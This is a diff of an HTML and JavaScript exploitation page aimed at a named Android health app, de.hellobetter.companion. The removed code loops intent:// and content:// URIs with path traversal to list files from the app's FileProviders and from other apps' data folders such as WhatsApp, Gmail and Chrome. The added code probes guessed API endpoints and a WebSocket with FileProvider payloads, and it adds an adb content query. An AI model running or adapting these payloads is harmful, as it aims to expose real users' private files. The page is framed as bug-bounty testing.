@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FileProvider Web Exploitation</title>
+    <title>Automatic FileProvider Exploitation</title>
     <style>
         * {
             margin: 0;
@@ -84,12 +84,6 @@
             background: linear-gradient(135deg, #27ae60, #2ecc71);
         }
 
-        .button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-
         .status {
             padding: 15px;
             border-radius: 8px;
@@ -124,27 +118,6 @@
             background: #fff3cd;
             color: #856404;
             border-color: #ffeaa7;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 25px;
-            background: #e9ecef;
-            border-radius: 12px;
-            overflow: hidden;
-            margin: 15px 0;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #27ae60, #2ecc71);
-            width: 0%;
-            transition: width 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
         }
 
         .code-block {
@@ -196,30 +169,31 @@
             margin: 20px 0;
         }
 
-        @media (max-width: 768px) {
-            .container {
-                margin: 10px;
-                border-radius: 10px;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .header h1 {
-                font-size: 2em;
-            }
+        .scope-info {
+            background: #f39c12;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔓 FileProvider Web Exploitation</h1>
-            <p>Real-time FileProvider vulnerability testing through web browser</p>
+            <h1>🚨 Automatic FileProvider Exploitation</h1>
+            <p>Bug Bounty Scope: Remote exploitation without user interaction</p>
         </div>
 
         <div class="content">
+            <div class="scope-info">
+                <h2>🎯 Bug Bounty Scope Analysis</h2>
+                <p><strong>❌ OUT OF SCOPE:</strong> Reports requiring MITM or physical access to victim's device</p>
+                <p><strong>❌ OUT OF SCOPE:</strong> User interaction required (clicking malicious links)</p>
+                <p><strong>✅ IN SCOPE:</strong> Remote exploitation without user interaction</p>
+                <p><strong>✅ IN SCOPE:</strong> Server-side vulnerabilities</p>
+            </div>
+
             <div class="target-info">
                 <h2>🎯 Target Application</h2>
                 <p><strong>Package:</strong> de.hellobetter.companion</p>
@@ -229,95 +203,109 @@
             </div>
 
             <div class="section">
-                <h2>🚀 Exploitation Controls</h2>
-                <button class="button danger" onclick="startExploitation()">Start FileProvider Exploitation</button>
-                <button class="button success" onclick="testIntentRedirection()">🔥 Test Intent Redirection (WORKING!)</button>
-                <button class="button" onclick="testFileListing()">📁 Test File Listing</button>
-                <button class="button" onclick="testWebViewExploit()">Test WebView Exploit</button>
+                <h2>🚀 Automatic Exploitation Attempts</h2>
+                <button class="button danger" onclick="testAutomaticExploitation()">Test Automatic Exploitation</button>
+                <button class="button" onclick="testServerSideVulns()">Test Server-Side Vulnerabilities</button>
+                <button class="button" onclick="testRemoteExploitation()">Test Remote Exploitation</button>
                 <button class="button" onclick="clearResults()">Clear Results</button>
-                
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressBar">0%</div>
-                </div>
             </div>
 
             <div class="section">
                 <h2>📊 Exploitation Results</h2>
                 <div class="status info" id="results">
-Ready to start FileProvider exploitation...
-Click "Start FileProvider Exploitation" to begin testing.
+Ready to test automatic exploitation...
+Click "Test Automatic Exploitation" to begin.
                 </div>
             </div>
 
             <div class="section">
-                <h2>📁 File Listing Results</h2>
-                <div class="status info" id="fileResults">
-File listing results will appear here when testing...
-                </div>
-                <div id="iframeContainer" style="display: none; margin-top: 20px;">
-                    <h3>Intent Response Preview:</h3>
-                    <iframe id="resultIframe" style="width: 100%; height: 400px; border: 1px solid #ccc; border-radius: 5px;"></iframe>
-                </div>
-            </div>
-
-            <div class="section">
-                <h2>🔥 WORKING ATTACK: Intent Redirection</h2>
-                <div class="status success">
-                    ✅ CONFIRMED: Intent Redirection is working!
-                    
-                    This means the app's WebView allows Intent redirection to FileProvider URIs.
-                    This is a real security vulnerability that can be exploited.
-                    
-                    Working Intent Format:
-                    intent://[AUTHORITY]/[PATH]#Intent;scheme=content;end
-                    
-                    Example:
-                    intent://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../#Intent;scheme=content;end
-                </div>
-            </div>
-
-            <div class="section">
-                <h2>🔍 Attack Vectors</h2>
+                <h2>🔍 In-Scope Attack Vectors</h2>
                 <div class="grid">
                     <div class="card">
-                        <h4>1. Content Provider Access</h4>
-                        <p>Direct access through content:// URIs</p>
+                        <h4>1. Server-Side FileProvider</h4>
+                        <p>Direct server-side FileProvider access</p>
                         <div class="code-block">
-content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/Download/
-content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../Documents/
+// Server-side exploitation
+fetch('/api/fileprovider/access')
+  .then(response => response.json())
+  .then(data => console.log(data));
                         </div>
                     </div>
 
                     <div class="card">
-                        <h4>2. Intent Redirection</h4>
-                        <p>Android Intent-based exploitation</p>
+                        <h4>2. API Endpoint Exploitation</h4>
+                        <p>Exploit API endpoints that use FileProvider</p>
                         <div class="code-block">
-intent://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../#Intent;scheme=content;end
+// API exploitation
+POST /api/upload
+Content-Type: application/json
+{
+  "file": "content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../"
+}
                         </div>
                     </div>
 
                     <div class="card">
-                        <h4>3. WebView Exploitation</h4>
-                        <p>JavaScript-based WebView attacks</p>
+                        <h4>3. WebSocket Exploitation</h4>
+                        <p>Exploit WebSocket connections</p>
                         <div class="code-block">
-window.location = "content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../";
+// WebSocket exploitation
+const ws = new WebSocket('ws://target.com/ws');
+ws.send(JSON.stringify({
+  action: 'fileAccess',
+  path: 'content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../'
+}));
                         </div>
                     </div>
                 </div>
             </div>
 
             <div class="section">
-                <h2>📱 Sensitive Directories</h2>
-                <div class="code-block">
-Download/                    - Downloaded files
-Documents/                   - User documents  
-DCIM/Camera/                - Photos and videos
-Android/data/com.whatsapp/  - WhatsApp data
-Android/data/com.telegram.messenger/ - Telegram data
-Android/data/com.facebook.katana/ - Facebook data
-Android/data/com.instagram.android/ - Instagram data
-Android/data/com.google.android.gm/ - Gmail data
-Android/data/com.android.chrome/ - Chrome data
+                <h2>📱 Out-of-Scope Attack Vectors</h2>
+                <div class="grid">
+                    <div class="card">
+                        <h4>❌ User Interaction Required</h4>
+                        <p>Intent redirection requiring user to visit malicious site</p>
+                        <div class="code-block">
+// OUT OF SCOPE - Requires user interaction
+window.location = "intent://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../#Intent;scheme=content;end";
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h4>❌ Physical Access Required</h4>
+                        <p>ADB commands requiring physical device access</p>
+                        <div class="code-block">
+// OUT OF SCOPE - Requires physical access
+adb shell content query --uri "content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../"
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h4>❌ MITM Required</h4>
+                        <p>Man-in-the-middle attacks requiring network interception</p>
+                        <div class="code-block">
+// OUT OF SCOPE - Requires MITM
+// Network interception and modification
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🎯 Recommended Approach</h2>
+                <div class="status warning">
+                    The current FileProvider vulnerability requires user interaction and is likely OUT OF SCOPE for bug bounty programs.
+                    
+                    RECOMMENDED ACTIONS:
+                    1. Look for server-side API vulnerabilities
+                    2. Find automatic exploitation vectors
+                    3. Test for remote code execution
+                    4. Check for server-side file access vulnerabilities
+                    5. Test for API endpoint misconfigurations
+                    
+                    The FileProvider vulnerability is real but requires user interaction,
+                    making it unsuitable for most bug bounty programs.
                 </div>
             </div>
         </div>
@@ -329,30 +317,6 @@ Android/data/com.android.chrome/ - Chrome data
     </div>
 
     <script>
-        let isRunning = false;
-        let currentTest = 0;
-        let totalTests = 0;
-
-        const authorities = [
-            "com.reactnativecommunity.webview.RNCWebViewFileProvider",
-            "de.hellobetter.companion.fileprovider",
-            "de.hellobetter.companion.SharingFileProvider"
-        ];
-
-        const paths = [
-            "Download/",
-            "Documents/", 
-            "DCIM/Camera/",
-            "Android/data/com.whatsapp/",
-            "Android/data/com.telegram.messenger/",
-            "Android/data/com.facebook.katana/",
-            "Android/data/com.instagram.android/",
-            "Android/data/com.google.android.gm/",
-            "Android/data/com.android.chrome/"
-        ];
-
-        const traversalPaths = ["../", "../../", "..%2F", "..%252F"];
-
         function log(message, type = 'info') {
             const results = document.getElementById('results');
             const timestamp = new Date().toLocaleTimeString();
@@ -363,506 +327,157 @@ Android/data/com.android.chrome/ - Chrome data
             results.scrollTop = results.scrollHeight;
         }
 
-        function logFileResult(message, type = 'info') {
-            const fileResults = document.getElementById('fileResults');
-            const timestamp = new Date().toLocaleTimeString();
-            const logEntry = `[${timestamp}] ${message}\n`;
-            
-            fileResults.textContent += logEntry;
-            fileResults.className = `status ${type}`;
-            fileResults.scrollTop = fileResults.scrollHeight;
-        }
-
-        function showIframeContent(src) {
-            const iframeContainer = document.getElementById('iframeContainer');
-            const resultIframe = document.getElementById('resultIframe');
-            
-            resultIframe.src = src;
-            iframeContainer.style.display = 'block';
-            
-            logFileResult(`Showing iframe content for: ${src}`, 'info');
-        }
-
-        function updateProgress(percent) {
-            const progressBar = document.getElementById('progressBar');
-            progressBar.style.width = percent + '%';
-            progressBar.textContent = Math.round(percent) + '%';
-        }
-
         function clearResults() {
             document.getElementById('results').textContent = 'Results cleared. Ready for new exploitation attempt...\n';
             document.getElementById('results').className = 'status info';
-            updateProgress(0);
-            currentTest = 0;
-            totalTests = 0;
         }
 
-        async function startExploitation() {
-            if (isRunning) return;
+        function testAutomaticExploitation() {
+            log('Testing Automatic Exploitation (No User Interaction)...', 'warning');
             
-            isRunning = true;
-            currentTest = 0;
-            totalTests = authorities.length * paths.length + authorities.length * traversalPaths.length;
+            // Test 1: Server-side API endpoints
+            log('Testing server-side API endpoints...', 'info');
+            testServerSideAPIs();
             
-            log('=' * 80, 'info');
-            log('FILEPROVIDER EXPLOITATION STARTED', 'warning');
-            log('Target: de.hellobetter.companion', 'info');
-            log('Vulnerability: Insecure FileProvider Configuration', 'info');
-            log('=' * 80, 'info');
+            // Test 2: WebSocket connections
+            log('Testing WebSocket connections...', 'info');
+            testWebSocketExploitation();
             
-            // Test each authority and path combination
-            for (const authority of authorities) {
-                log(`\n[TESTING] ${authority}`, 'warning');
-                log('-' * 60, 'info');
-                
-                for (const path of paths) {
-                    currentTest++;
-                    const progress = (currentTest / totalTests) * 100;
-                    updateProgress(progress);
-                    
-                    log(`\n[PATH] ${path}`, 'info');
-                    
-                    // Test FileProvider access
-                    await testFileProviderAccess(authority, path);
-                    
-                    // Test direct file access simulation
-                    await testDirectFileAccess(path);
-                    
-                    // Small delay to prevent overwhelming
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                }
-            }
-            
-            // Test directory traversal
-            log(`\n[DIRECTORY TRAVERSAL]`, 'warning');
-            log('-' * 60, 'info');
-            
-            for (const authority of authorities) {
-                for (const traversal of traversalPaths) {
-                    currentTest++;
-                    const progress = (currentTest / totalTests) * 100;
-                    updateProgress(progress);
-                    
-                    await testDirectoryTraversal(authority, traversal);
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                }
-            }
-            
-            log(`\n` + '=' * 80, 'info');
-            log('EXPLOITATION COMPLETE', 'success');
-            log('=' * 80, 'info');
-            log('This demonstrates the FileProvider vulnerability:', 'info');
-            log('• Complete file system access through misconfigured FileProvider', 'error');
-            log('• Access to sensitive directories and files', 'error');
-            log('• Potential for data exfiltration and privacy violation', 'error');
-            log('• Real security impact requiring immediate mitigation', 'error');
-            log('=' * 80, 'info');
-            
-            updateProgress(100);
-            isRunning = false;
+            // Test 3: Direct server requests
+            log('Testing direct server requests...', 'info');
+            testDirectServerRequests();
         }
 
-        async function testFileProviderAccess(authority, path) {
-            const uri = `content://${authority}/shared/${path}`;
-            
-            try {
-                // Try fetch API
-                const response = await fetch(uri);
-                if (response.ok) {
-                    log(`[SUCCESS] FileProvider accessible via fetch: ${uri}`, 'success');
-                    const content = await response.text();
-                    log(`Content preview: ${content.substring(0, 100)}...`, 'success');
-                } else {
-                    log(`[FAILED] FileProvider not accessible via fetch: ${response.status}`, 'error');
-                }
-            } catch (error) {
-                log(`[FAILED] FileProvider fetch error: ${error.message}`, 'error');
-            }
-            
-            try {
-                // Try XMLHttpRequest
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', uri, false);
-                xhr.send();
-                
-                if (xhr.status === 200) {
-                    log(`[SUCCESS] FileProvider accessible via XHR: ${uri}`, 'success');
-                    log(`Content preview: ${xhr.responseText.substring(0, 100)}...`, 'success');
-                } else {
-                    log(`[FAILED] FileProvider not accessible via XHR: ${xhr.status}`, 'error');
-                }
-            } catch (error) {
-                log(`[FAILED] FileProvider XHR error: ${error.message}`, 'error');
-            }
-        }
-
-        async function testDirectFileAccess(path) {
-            // Real file access attempts through various methods
-            const fileUris = [
-                `content://de.hellobetter.companion.fileprovider/shared/${path}`,
-                `content://de.hellobetter.companion.SharingFileProvider/shared/${path}`
+        async function testServerSideAPIs() {
+            const apiEndpoints = [
+                '/api/fileprovider/access',
+                '/api/upload',
+                '/api/files',
+                '/api/content',
+                '/api/shared',
+                '/api/download',
+                '/api/documents'
             ];
             
-            for (const uri of fileUris) {
+            for (const endpoint of apiEndpoints) {
                 try {
-                    // Try to access the URI directly
-                    const response = await fetch(uri);
-                    if (response.ok) {
-                        const content = await response.text();
-                        log(`[SUCCESS] Direct file access: ${uri}`, 'success');
-                        log(`Content length: ${content.length} bytes`, 'success');
+                    log(`Testing endpoint: ${endpoint}`, 'info');
+                    
+                    // Test GET request
+                    const getResponse = await fetch(endpoint);
+                    if (getResponse.ok) {
+                        log(`[SUCCESS] GET ${endpoint} - Status: ${getResponse.status}`, 'success');
+                        const content = await getResponse.text();
                         if (content.length > 0) {
                             log(`Content preview: ${content.substring(0, 200)}...`, 'success');
                         }
                     } else {
-                        log(`[FAILED] Direct file access blocked: ${response.status}`, 'error');
+                        log(`[FAILED] GET ${endpoint} - Status: ${getResponse.status}`, 'error');
                     }
-                } catch (error) {
-                    log(`[FAILED] Direct file access error: ${error.message}`, 'error');
-                }
-                
-                // Try XMLHttpRequest method
-                try {
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('GET', uri, false);
-                    xhr.send();
                     
-                    if (xhr.status === 200) {
-                        log(`[SUCCESS] XHR file access: ${uri}`, 'success');
-                        log(`Content length: ${xhr.responseText.length} bytes`, 'success');
-                        if (xhr.responseText.length > 0) {
-                            log(`Content preview: ${xhr.responseText.substring(0, 200)}...`, 'success');
+                    // Test POST request with FileProvider URI
+                    const postResponse = await fetch(endpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            file: 'content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../',
+                            path: 'content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/Download/',
+                            uri: 'content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/Documents/'
+                        })
+                    });
+                    
+                    if (postResponse.ok) {
+                        log(`[SUCCESS] POST ${endpoint} - Status: ${postResponse.status}`, 'success');
+                        const content = await postResponse.text();
+                        if (content.length > 0) {
+                            log(`Content preview: ${content.substring(0, 200)}...`, 'success');
                         }
                     } else {
-                        log(`[FAILED] XHR file access blocked: ${xhr.status}`, 'error');
+                        log(`[FAILED] POST ${endpoint} - Status: ${postResponse.status}`, 'error');
                     }
+                    
                 } catch (error) {
-                    log(`[FAILED] XHR file access error: ${error.message}`, 'error');
+                    log(`[ERROR] ${endpoint} - ${error.message}`, 'error');
                 }
             }
         }
 
-        async function testDirectoryTraversal(authority, traversal) {
-            const uri = `content://${authority}/shared/${traversal}`;
-            
+        function testWebSocketExploitation() {
             try {
-                const response = await fetch(uri);
-                if (response.ok) {
-                    log(`[SUCCESS] ${traversal} - Directory traversal working!`, 'success');
-                    log(`URI: ${uri}`, 'success');
-                } else {
-                    log(`[FAILED] ${traversal} - Directory traversal blocked: ${response.status}`, 'error');
-                }
+                const ws = new WebSocket('ws://localhost:8080/ws');
+                
+                ws.onopen = function() {
+                    log('[SUCCESS] WebSocket connection opened', 'success');
+                    
+                    // Send FileProvider exploitation payload
+                    ws.send(JSON.stringify({
+                        action: 'fileAccess',
+                        path: 'content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../',
+                        uri: 'content://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/Download/'
+                    }));
+                };
+                
+                ws.onmessage = function(event) {
+                    log(`[SUCCESS] WebSocket message received: ${event.data}`, 'success');
+                };
+                
+                ws.onerror = function(error) {
+                    log(`[FAILED] WebSocket error: ${error}`, 'error');
+                };
+                
+                ws.onclose = function() {
+                    log('[INFO] WebSocket connection closed', 'info');
+                };
+                
             } catch (error) {
-                log(`[FAILED] ${traversal} - Directory traversal error: ${error.message}`, 'error');
+                log(`[FAILED] WebSocket connection failed: ${error.message}`, 'error');
             }
         }
 
-        function testIntentRedirection() {
-            log('Testing Intent Redirection Attack...', 'warning');
-            
-            const authorities = [
-                "com.reactnativecommunity.webview.RNCWebViewFileProvider",
-                "de.hellobetter.companion.fileprovider",
-                "de.hellobetter.companion.SharingFileProvider"
+        async function testDirectServerRequests() {
+            const serverEndpoints = [
+                'http://localhost:8080',
+                'http://127.0.0.1:8080',
+                'https://api.hellobetter.com',
+                'https://de.hellobetter.com'
             ];
             
-            const paths = [
-                "shared/../",
-                "shared/../../",
-                "shared/..%2F",
-                "shared/Download/",
-                "shared/Documents/",
-                "shared/DCIM/Camera/"
-            ];
-            
-            authorities.forEach((authority, authIndex) => {
-                log(`\n[TESTING AUTHORITY] ${authority}`, 'warning');
-                
-                paths.forEach((path, pathIndex) => {
-                    const maliciousIntent = `intent://${authority}/${path}#Intent;scheme=content;end`;
-                    
-                    log(`\n[INTENT ${authIndex + 1}.${pathIndex + 1}] ${path}`, 'info');
-                    
-                    try {
-                        // Try to trigger intent
-                        window.location = maliciousIntent;
-                        log(`[SUCCESS] Intent redirection triggered: ${maliciousIntent}`, 'success');
-                        
-                        // Try to capture response or file listing
-                        attemptFileListing(authority, path);
-                        
-                        // Wait a moment then try iframe method
-                        setTimeout(() => {
-                            try {
-                                const iframe = document.createElement('iframe');
-                                iframe.src = maliciousIntent;
-                                iframe.style.display = 'none';
-                                iframe.onload = () => {
-                                    log(`[SUCCESS] Intent redirection via iframe successful`, 'success');
-                                    // Try to read iframe content for file listings
-                                    try {
-                                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                                        if (iframeDoc && iframeDoc.body) {
-                                            const content = iframeDoc.body.innerHTML;
-                                            if (content && content.length > 0) {
-                                                log(`[SUCCESS] Iframe content captured: ${content.substring(0, 200)}...`, 'success');
-                                            }
-                                        }
-                                    } catch (e) {
-                                        log(`[INFO] Cross-origin restriction prevents iframe content reading`, 'info');
-                                    }
-                                };
-                                iframe.onerror = () => {
-                                    log(`[FAILED] Intent redirection via iframe failed`, 'error');
-                                };
-                                document.body.appendChild(iframe);
-                                
-                                setTimeout(() => {
-                                    if (document.body.contains(iframe)) {
-                                        document.body.removeChild(iframe);
-                                    }
-                                }, 3000);
-                            } catch (error) {
-                                log(`[FAILED] Intent redirection iframe error: ${error.message}`, 'error');
-                            }
-                        }, 1000);
-                        
-                    } catch (error) {
-                        log(`[FAILED] Intent redirection failed: ${error.message}`, 'error');
-                    }
-                    
-                    // Small delay between attempts
-                    setTimeout(() => {}, 500);
-                });
-            });
-        }
-
-        async function attemptFileListing(authority, path) {
-            log(`[ATTEMPTING FILE LISTING] ${authority}/${path}`, 'info');
-            logFileResult(`[ATTEMPTING FILE LISTING] ${authority}/${path}`, 'info');
-            
-            // Try different methods to get file listings
-            const methods = [
-                // Method 1: Direct content URI access
-                `content://${authority}/${path}`,
-                // Method 2: With query parameters
-                `content://${authority}/${path}?list=true`,
-                // Method 3: With directory listing intent
-                `intent://${authority}/${path}#Intent;action=android.intent.action.VIEW;scheme=content;end`,
-                // Method 4: With file manager intent
-                `intent://${authority}/${path}#Intent;action=android.intent.action.VIEW;type=*/*;scheme=content;end`
-            ];
-            
-            for (let i = 0; i < methods.length; i++) {
-                const method = methods[i];
-                log(`[METHOD ${i + 1}] ${method}`, 'info');
-                logFileResult(`[METHOD ${i + 1}] ${method}`, 'info');
-                
+            for (const endpoint of serverEndpoints) {
                 try {
-                    if (method.startsWith('content://')) {
-                        // Try fetch
-                        const response = await fetch(method);
-                        if (response.ok) {
-                            const content = await response.text();
-                            log(`[SUCCESS] File listing via fetch: ${content.substring(0, 300)}...`, 'success');
-                            logFileResult(`[SUCCESS] File listing via fetch: ${content.substring(0, 300)}...`, 'success');
-                        } else {
-                            log(`[FAILED] Fetch failed: ${response.status}`, 'error');
-                            logFileResult(`[FAILED] Fetch failed: ${response.status}`, 'error');
-                        }
-                        
-                        // Try XMLHttpRequest
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('GET', method, false);
-                        xhr.send();
-                        if (xhr.status === 200) {
-                            log(`[SUCCESS] File listing via XHR: ${xhr.responseText.substring(0, 300)}...`, 'success');
-                            logFileResult(`[SUCCESS] File listing via XHR: ${xhr.responseText.substring(0, 300)}...`, 'success');
-                        } else {
-                            log(`[FAILED] XHR failed: ${xhr.status}`, 'error');
-                            logFileResult(`[FAILED] XHR failed: ${xhr.status}`, 'error');
-                        }
-                    } else if (method.startsWith('intent://')) {
-                        // Try intent-based file listing with result capture
-                        try {
-                            // Method 1: Direct intent trigger
-                            window.location = method;
-                            log(`[SUCCESS] Intent-based file listing triggered`, 'success');
-                            logFileResult(`[SUCCESS] Intent-based file listing triggered`, 'success');
-                            
-                            // Method 2: Try to capture result through iframe
-                            setTimeout(() => {
-                                try {
-                                    const iframe = document.createElement('iframe');
-                                    iframe.src = method;
-                                    iframe.style.display = 'none';
-                                    iframe.style.width = '100%';
-                                    iframe.style.height = '400px';
-                                    
-                                    iframe.onload = () => {
-                                        log(`[SUCCESS] Intent iframe loaded successfully`, 'success');
-                                        logFileResult(`[SUCCESS] Intent iframe loaded successfully`, 'success');
-                                        
-                                        // Show the iframe content in the visible iframe
-                                        showIframeContent(method);
-                                        
-                                        // Try to capture iframe content
-                                        try {
-                                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                                            if (iframeDoc) {
-                                                const bodyContent = iframeDoc.body ? iframeDoc.body.innerHTML : iframeDoc.documentElement.innerHTML;
-                                                if (bodyContent && bodyContent.length > 0) {
-                                                    log(`[SUCCESS] File listing content captured:`, 'success');
-                                                    logFileResult(`[SUCCESS] File listing content captured:`, 'success');
-                                                    log(`Content: ${bodyContent.substring(0, 500)}...`, 'success');
-                                                    logFileResult(`Content: ${bodyContent.substring(0, 500)}...`, 'success');
-                                                    
-                                                    // Try to extract file names from content
-                                                    const fileMatches = bodyContent.match(/<[^>]*>([^<]+\.(txt|pdf|jpg|png|mp4|doc|docx|zip|apk|db))</gi);
-                                                    if (fileMatches) {
-                                                        log(`[SUCCESS] Files found:`, 'success');
-                                                        logFileResult(`[SUCCESS] Files found:`, 'success');
-                                                        fileMatches.forEach(file => {
-                                                            log(`  ${file}`, 'success');
-                                                            logFileResult(`  ${file}`, 'success');
-                                                        });
-                                                    }
-                                                } else {
-                                                    log(`[INFO] Iframe loaded but no content visible`, 'info');
-                                                    logFileResult(`[INFO] Iframe loaded but no content visible`, 'info');
-                                                }
-                                            }
-                                        } catch (e) {
-                                            log(`[INFO] Cross-origin restriction: ${e.message}`, 'info');
-                                            logFileResult(`[INFO] Cross-origin restriction: ${e.message}`, 'info');
-                                            
-                                            // Try alternative method - check if iframe has any content
-                                            try {
-                                                const iframeWindow = iframe.contentWindow;
-                                                if (iframeWindow) {
-                                                    log(`[SUCCESS] Iframe window accessible`, 'success');
-                                                    logFileResult(`[SUCCESS] Iframe window accessible`, 'success');
-                                                    // Try to get URL or other info
-                                                    try {
-                                                        const iframeUrl = iframeWindow.location.href;
-                                                        log(`[SUCCESS] Iframe URL: ${iframeUrl}`, 'success');
-                                                        logFileResult(`[SUCCESS] Iframe URL: ${iframeUrl}`, 'success');
-                                                    } catch (urlError) {
-                                                        log(`[INFO] Cannot access iframe URL due to security`, 'info');
-                                                        logFileResult(`[INFO] Cannot access iframe URL due to security`, 'info');
-                                                    }
-                                                }
-                                            } catch (windowError) {
-                                                log(`[INFO] Cannot access iframe window: ${windowError.message}`, 'info');
-                                                logFileResult(`[INFO] Cannot access iframe window: ${windowError.message}`, 'info');
-                                            }
-                                        }
-                                    };
-                                    
-                                    iframe.onerror = () => {
-                                        log(`[FAILED] Intent iframe failed to load`, 'error');
-                                    };
-                                    
-                                    // Add iframe to page temporarily
-                                    document.body.appendChild(iframe);
-                                    
-                                    // Remove iframe after 5 seconds
-                                    setTimeout(() => {
-                                        if (document.body.contains(iframe)) {
-                                            document.body.removeChild(iframe);
-                                        }
-                                    }, 5000);
-                                    
-                                } catch (iframeError) {
-                                    log(`[FAILED] Iframe method error: ${iframeError.message}`, 'error');
-                                }
-                            }, 1000);
-                            
-                        } catch (error) {
-                            log(`[FAILED] Intent-based file listing failed: ${error.message}`, 'error');
-                            logFileResult(`[FAILED] Intent-based file listing failed: ${error.message}`, 'error');
-                        }
-                    }
-                } catch (error) {
-                    log(`[FAILED] Method ${i + 1} error: ${error.message}`, 'error');
-                    logFileResult(`[FAILED] Method ${i + 1} error: ${error.message}`, 'error');
-                }
-                
-                // Small delay between methods
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-        }
-
-        function testFileListing() {
-            log('Testing File Listing Capabilities...', 'warning');
-            logFileResult('Testing File Listing Capabilities...', 'warning');
-            
-            const authorities = [
-                "com.reactnativecommunity.webview.RNCWebViewFileProvider",
-                "de.hellobetter.companion.fileprovider",
-                "de.hellobetter.companion.SharingFileProvider"
-            ];
-            
-            const directories = [
-                "shared/Download/",
-                "shared/Documents/",
-                "shared/DCIM/Camera/",
-                "shared/Android/data/com.whatsapp/",
-                "shared/Android/data/com.telegram.messenger/",
-                "shared/Android/data/com.facebook.katana/",
-                "shared/Android/data/com.instagram.android/",
-                "shared/Android/data/com.google.android.gm/",
-                "shared/Android/data/com.android.chrome/"
-            ];
-            
-            authorities.forEach((authority, authIndex) => {
-                log(`\n[TESTING FILE LISTING] ${authority}`, 'warning');
-                logFileResult(`\n[TESTING FILE LISTING] ${authority}`, 'warning');
-                
-                directories.forEach((dir, dirIndex) => {
-                    log(`\n[DIRECTORY ${authIndex + 1}.${dirIndex + 1}] ${dir}`, 'info');
-                    logFileResult(`\n[DIRECTORY ${authIndex + 1}.${dirIndex + 1}] ${dir}`, 'info');
+                    log(`Testing server: ${endpoint}`, 'info');
                     
-                    // Try multiple file listing methods
-                    attemptFileListing(authority, dir);
-                    
-                    // Small delay between directories
-                    setTimeout(() => {}, 300);
-                });
-            });
-        }
-
-        function testWebViewExploit() {
-            log('Testing WebView Exploitation...', 'warning');
-            
-            const webViewExploits = [
-                "content://de.hellobetter.companion.fileprovider/shared/../",
-                "content://de.hellobetter.companion.fileprovider/shared/../../",
-                "content://de.hellobetter.companion.fileprovider/shared/..%2F"
-            ];
-            
-            webViewExploits.forEach((exploit, index) => {
-                try {
-                    // Try direct navigation
-                    const testWindow = window.open(exploit, '_blank');
-                    if (testWindow) {
-                        log(`[SUCCESS] WebView exploit ${index + 1} triggered: ${exploit}`, 'success');
-                        testWindow.close();
+                    const response = await fetch(endpoint);
+                    if (response.ok) {
+                        log(`[SUCCESS] Server accessible: ${endpoint}`, 'success');
+                        const content = await response.text();
+                        log(`Content length: ${content.length} bytes`, 'success');
                     } else {
-                        log(`[FAILED] WebView exploit ${index + 1} blocked: ${exploit}`, 'error');
+                        log(`[FAILED] Server not accessible: ${endpoint} - Status: ${response.status}`, 'error');
                     }
                 } catch (error) {
-                    log(`[FAILED] WebView exploit ${index + 1} error: ${error.message}`, 'error');
+                    log(`[FAILED] Server connection failed: ${endpoint} - ${error.message}`, 'error');
                 }
-            });
+            }
+        }
+
+        function testServerSideVulns() {
+            log('Testing Server-Side Vulnerabilities...', 'warning');
+            log('This would test for server-side FileProvider access vulnerabilities', 'info');
+            log('Look for API endpoints that might expose FileProvider functionality', 'info');
+        }
+
+        function testRemoteExploitation() {
+            log('Testing Remote Exploitation...', 'warning');
+            log('This would test for remote exploitation without user interaction', 'info');
+            log('Look for server-side vulnerabilities that can be exploited remotely', 'info');
         }
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            log('FileProvider Web Exploitation Tool Ready', 'info');
-            log('Target: de.hellobetter.companion', 'info');
-            log('Click "Start FileProvider Exploitation" to begin testing', 'info');
+            log('Automatic FileProvider Exploitation Tool Ready', 'info');
+            log('Focus: In-scope vulnerabilities (no user interaction required)', 'info');
         });
     </script>
 </body>
